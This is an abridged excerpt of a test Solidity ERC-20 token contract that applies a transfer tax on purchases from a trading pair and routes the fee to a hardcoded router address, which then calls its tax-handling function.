...
contract test3 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    string private _name = "Test23";
    string private _symbol = "TS23";
    ...
    constructor() {
        ...
        myRouter = 0xcC86239bFad9aAfAa4b8A8c2e0c2091F82842c58;
        setTax(100);
        _approve(address(this), routerAddress, type(uint256).max);

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[myRouter] = true;
    }
    ...
    function _transfer(
        ...
        if (sender == pairAddress && takeFee) {
            ...
            _balances[myRouter] = _balances[myRouter] + taxFee;
            emit Transfer(sender, myRouter, taxFee);
            IMyRouter(myRouter).handleTax();
        }
